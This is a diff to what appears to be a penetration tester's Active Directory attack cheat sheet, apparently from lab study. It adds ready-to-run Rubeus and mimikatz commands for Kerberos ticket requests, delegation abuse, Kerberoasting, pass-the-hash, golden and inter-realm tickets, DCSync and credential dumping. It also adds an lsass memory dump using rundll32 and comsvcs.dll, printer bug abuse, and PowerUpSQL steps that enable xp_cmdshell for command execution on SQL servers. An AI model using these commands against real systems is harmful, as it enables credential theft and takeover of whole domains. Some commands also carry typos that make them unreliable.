@@ -807,3 +807,72 @@ echo '$ANSIBLE_VAULT;1.1;AES256
 33353861663464313866353330376566346636303334353732383564633263373862' | ansible-vault decrypt && echo
 # method 2 
 ansible-vault view --ask-vault-pass encrypted.txt
+
+[Rubeus]
+#### Retrieve hash from plain-text
+$ Rubeus.exe hash /password:P@$$w0rd! /user:studentuser /domain:DEV
+#### Request TGT from KDC (Do not reaquire local administrator priv)
+$ Rubeus.exe asktgt /user:studentuser /password:P@$$w0rd! /domain:DEV
+$ Rubeus.exe asktgt /user:studentuser /rc4:<ntlm has> /domain:DEV
+#### Request TGS from specific application server
+$ Rubeus.exe asktgs /ticket:tick.kirbi /service:HTTP/dc01.eu.local /dc:eu-dc.eu.local /domain:eu.local /ptt
+#### s4u delegation (method 1: without current user session)
+$ Rubeus.exe s4u /user:studentuser /rc4:<ntlm hash> /impersonateuser:administrator /msdsspn:"time/dc01.eu.local" /altservice:http,host,cifs /ptt
+#### s4u delegation (method 2: with current user session)
+$ Rubeus.exe tgtdeleg /nowrap
+$ Rubeus.exe s4u /ticket:<base64 blob> /impersonateuser:adminstrator /msdsspn:"time/dc01.eu.local" /altservice:http,host,cifs /ptt
+#### Inject ticket to klist
+$ Rubeus.exe ptt /ticket:ticketfile.kirbi
+$ Rubeus.exe ptt /ticket:<base64 blob>
+#### Users' with SPN (Kerberoast)
+$ Rubeus.exe kerberoast /nowrap
+#### monitor ticket
+$ Rubeus.exe monitor /interval:5
+
+[mimikatz]
+#### overpass-the-hash (this requires local administrator priv)
+$ sekurlsa::pth /user:studentuser /ntlm:<ntlm hash> /domain:DEV /run:powershell.exe
+#### forged golden ticket with extra sids
+$ kerberos::golden /user:administrator /sid:<current-domain-sid> /sids:<trusted-domain-sid> /ktbtgt:<currentdomain-krbtgt-hash> /domain:curdomain.local /ptt
+#### DCsync
+$ lsadump::dcsync /domain:DEV.fortress.local /all /csv
+#### Dump trust keys
+$ sekurlsa::trust /patch
+#### Forged inter-realm tgt with trust key (only works when sid history is enabled)
+$ kerberos::golden /user:administrator /domain:dev.local /sid:<current-domain-sid> /rc4:<trust-key> /service:krbtgt /target:euvendor.local /sids:<trusted-domain-users-sid with RID>1000 > /ticket:saveticket.kirbi
+#### Dump tgt in current session (Unconstrained)
+$ sekurlsa::tickets /export
+#### Minidump (when you have lsass.dmp file) ####
+$ sekurlsa::minidump C:\Windows\Tasks\lsass.dmp
+$ sekrulsa::logonpasswords
+
+[dump lsass with signed binary]
+#### Get lsass.exe PID
+Get-Process lsass | select id
+#### Dump process with rundll32.exe
+rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 736 C:\Windows\Tasks\lsass.dmp full
+
+[Abusing Printer Bug]
+#### Monitor ticket with rubeus.exe
+$ Rubeus.exe monitor /interval:5
+#### Use spoolsample.exe to initiate spooler connection
+$ spollssample.exe web.eu.local dc.eu.local
+
+[Get Shadow Principal]
+#### Use AD Module/RSAT
+Get-ADObject -Filter * -SearchBase ("CN=Shadow Principal Configuration,CN=Services," + (Get-ADRootDSE).configurationNamingContext) | select Name,member,msDS-ShadowPrincipalSid | fl
+
+[PowerUpSQL: Enumerate Domain DB Instances]
+#### Get Local Instance
+$ Get-SQLInstanceLocal -Verbose
+#### Get Instances in current domain
+$ Get-SQLInstanceDomain -Verbose
+#### Get SQL linked server
+$ Get-SQLServerLinkCrawl -Instance us-mssql.techcorp.local
+#### Execute query in linked server
+$ Get-SQLServerLinkCrawl -Instance us-mssql -Query 'exec master..xp_cmdshell ''whoami'''
+#### Execute Query (enable xp_cmdshell and remote code exec)
+$ Get-SQLQuery -Query 'EXECUTE(''sp_configure ''''xp_cmdshell'''',1;reconfigure;'') AT "DB-SQLSRV"'
+$ Get-SQLQuery -Query 'EXECUTE(''xp_cmdshell ''''whoami'''''') AT "DB-SQLSRV"'
+#### Execute OS command on sql server
+Invoke-SQLOSCmd -Instance fortress-db -Command "whoami"
